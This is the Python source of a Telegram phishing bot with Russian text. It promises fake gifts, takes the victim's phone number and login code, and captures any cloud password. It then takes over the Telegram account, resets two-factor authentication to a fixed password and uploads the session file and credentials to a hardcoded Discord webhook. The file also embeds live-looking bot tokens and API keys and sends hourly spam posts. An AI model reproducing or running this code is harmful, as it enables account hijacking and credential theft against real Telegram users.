import asyncio
import os
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from aiogram.dispatcher.filters import Text
from telethon import TelegramClient
from telethon.sessions import SQLiteSession
from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError
import aioschedule

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "8496063485:AAGGJpcjFEyLI8bM4hsA6sYmDHYgzb3kRm8"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1411003346126635082/lgiKWDpfa7L_D83oOEjxyX85VF1yNHKdwnmuEfaBLhDyCDO9fXGlMi_tbCez_cONu_lZ"
API_ID = 24647488
API_HASH = "5359d6239969c07a29ea06167484a885"
TARGET_CHAT_ID = "8496063485"  # куда будут отправляться рассылки
# =============================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_data = {}

templates = [
    "✨ УСПЕЙ ЗАБРАТЬ 1 ИЗ 1000 КОЛЕЦ 💍",
    "🔥 ЗАБЕРИ МИШКУ ТОЛЬКО СЕГОДНЯ 🔥",
]

photos = [
    "photos/1.png",
    "photos/2.png",
]

index = 0

# ====== Функция отправки расписания ======
async def send_scheduled_message():
    global index
    try:
        if os.path.exists(photos[index]):
            with open(photos[index], 'rb') as photo:
                await bot.send_photo(chat_id=TARGET_CHAT_ID, photo=photo, caption=templates[index])
            print(f"✅ Отправлено сообщение {index + 1}: {templates[index]}")
        index = (index + 1) % len(templates)
    except Exception as e:
        print(f"❌ Ошибка при отправке рассылки: {e}")

async def scheduler():
    aioschedule.every(1).hours.do(send_scheduled_message)
    while True:
        await aioschedule.run_pending()
        await asyncio.sleep(1)

async def on_startup(dp):
    asyncio.create_task(scheduler())
    print("🚀 Бот запущен!")

# ====== Стартовый обработчик ======
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text="🎁 Получить подарок 🎁", callback_data="get_reward"))
    if os.path.exists("photos/start.png"):
        with open("photos/start.png", "rb") as photo:
            await message.answer_photo(photo=photo, caption="Привет! Твой подарок ждёт тебя 🎁", reply_markup=kb)
    else:
        await message.answer("Привет! Твой подарок ждёт тебя 🎁", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "get_reward")
async def process_callback_get_reward(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton(text="🤖Пройти проверку", request_contact=True))
    await bot.send_message(callback_query.from_user.id, "Пройди проверку и получи подарок!", reply_markup=kb)

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    phone = message.contact.phone_number
    session_name = f"sessions/{phone}"
    os.makedirs("sessions", exist_ok=True)
    client = TelegramClient(SQLiteSession(session_name), API_ID, API_HASH)
    await client.connect()
    user_data[message.from_user.id] = {"client": client, "phone": phone, "code": "", "has_password": False, "user_password": None}
    try:
        await client.send_code_request(phone)
    except Exception as e:
        await message.answer(f"❌ Ошибка при отправке кода: {e}")
        return
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    buttons = [str(i) for i in range(1, 10)] + ['0', 'Удалить', 'Подтвердить']
    kb.add(*buttons)
    await message.answer("Введите код, отправленный в Telegram:", reply_markup=kb)

@dp.message_handler(Text(equals=[str(i) for i in range(10)] + ['Удалить']))
async def enter_code(message: types.Message):
    data = user_data.get(message.from_user.id)
    if not data:
        await message.answer("Ошибка: сначала отправьте контакт.")
        return
    if message.text == "Удалить":
        data["code"] = data["code"][:-1]
    else:
        data["code"] += message.text
    await message.answer(f"Код подтверждения: {data['code']}")

@dp.message_handler(Text(equals='Подтвердить'))
async def confirm_code(message: types.Message):
    data = user_data.get(message.from_user.id)
    if not data:
        await message.answer("Ошибка: нет данных авторизации.")
        return
    client = data["client"]
    phone = data["phone"]
    code = data["code"]
    try:
        await client.sign_in(phone=phone, code=code)
        # Установим кастомный пароль lol123
        try:
            await client.edit_2fa(new_password='lol123', hint='lol123')
        except Exception as e:
            print(f"Ошибка при установке пароля: {e}")
        await finish_session(message, client, phone)
    except SessionPasswordNeededError:
        data["has_password"] = True
        await message.answer("Введите ваш облачный пароль:")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda message: len(message.text) >= 4)
async def handle_password(message: types.Message):
    data = user_data.get(message.from_user.id)
    if not data:
        return
    client = data["client"]
    password_text = message.text
    try:
        if data["has_password"]:
            data["user_password"] = password_text
            await client.sign_in(password=password_text)
        await finish_session(message, client, data["phone"], data["user_password"])
    except PasswordHashInvalidError:
        await message.answer("❌ Неверный пароль. Попробуйте еще раз:")
    except Exception as e:
        await message.answer(f"❌ Ошибка при вводе пароля: {e}")

async def finish_session(message: types.Message, client: TelegramClient, phone: str, user_password=None):
    await client.disconnect()
    session_path = f"sessions/{phone}.session"
    discord_data = {"content": f"📱 Новая сессия\nТелефон: {phone}\n"}
    if user_password:
        discord_data["content"] += f"Пароль пользователя: ||{user_password}||"
    else:
        discord_data["content"] += "Пароль установлен: lol123"
    try:
        requests.post(DISCORD_WEBHOOK, json=discord_data)
        if os.path.exists(session_path):
            with open(session_path, "rb") as f:
                requests.post(DISCORD_WEBHOOK, files={"file": (f"{phone}.session", f)})
    except:
        pass
    await message.answer("✅ Проверка завершена!", reply_markup=ReplyKeyboardRemove())

if __name__ == "__main__":
    print("🚀 Бот запускается...")
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
